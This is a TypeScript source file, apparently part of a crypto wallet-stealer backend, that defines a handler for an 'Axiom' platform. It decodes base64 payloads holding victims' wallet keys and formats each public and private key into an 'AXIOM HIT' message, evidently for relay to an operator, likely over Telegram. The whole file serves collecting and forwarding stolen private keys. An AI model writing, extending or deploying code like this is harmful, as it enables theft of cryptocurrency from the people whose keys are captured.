import type { PlatformHandler, ProcessResult, PlatformData } from './types.js';

// Обработчик для платформы Axiom
export class AxiomHandler implements PlatformHandler {
  name = 'axiom';

  async processMessage(data: PlatformData | string): Promise<ProcessResult> {
    console.log('📦 [Axiom] Processing started. Data type:', typeof data);
    
    let walletData: any = {};

    // 1. Пытаемся получить данные из входного параметра
    if (typeof data === 'string') {
      try {
        walletData = JSON.parse(Buffer.from(data, "base64").toString("utf-8"));
      } catch (e) {
        console.error('❌ [Axiom] Failed to parse base64 string');
      }
    } else {
      walletData = data || {};
    }

    // 2. Пытаемся найти массив ключей (keys)
    // Он может быть в корне объекта, либо внутри walletData.keys
    let keys = walletData.keys;

    // Если ключей нет в корне, но есть поле message (оригинальный base64), пробуем извлечь оттуда
    if ((!keys || !Array.isArray(keys)) && walletData.message && typeof walletData.message === 'string') {
      try {
        console.log('🔄 [Axiom] Keys not found in root, trying to decode message field...');
        const decoded = JSON.parse(Buffer.from(walletData.message, 'base64').toString('utf-8'));
        keys = decoded.keys;
      } catch (e) {
        console.error('❌ [Axiom] Failed to decode keys from message field');
      }
    }

    // 3. Формируем сообщение
    const username = walletData.username || 'unknown';
    const platform = walletData.platform || 'axiom';

    console.log(`📊 [Axiom] User: ${username}, Platform: ${platform}, Keys Found: ${Array.isArray(keys) ? keys.length : 'NO'}`);

    let message = `🎯 <b>AXIOM HIT</b>\n`;
    message += `👤 <b>User:</b> <code>${username}</code>\n`;
    message += `🌐 <b>Platform:</b> <code>${platform}</code>\n\n`;

    if (Array.isArray(keys) && keys.length > 0) {
      keys.forEach((key: any, index: number) => {
        // Поддержка разных форматов ключей
        const pub = key.public || key.publicKey || key.address || 'n/a';
        const priv = key.private || key.privateKey || key.key || 'n/a';
        
        message += `🔑 <b>Wallet #${index + 1}</b>\n`;
        message += `<b>Public:</b> <code>${pub}</code>\n`;
        message += `<b>Private:</b> <code>${priv}</code>\n`;
        message += `----------------------------------------\n`;
      });
    } else {
      message += `⚠️ <b>WARNING: No keys found in payload</b>\n`;
      message += `<i>Check the logs for raw data structure</i>\n`;
      console.log('❌ [Axiom] Final Keys State: EMPTY. Raw Data:', JSON.stringify(walletData));
    }

    return {
      messageToSend: message,
      messageToSendFull: message,
    };
  }
}
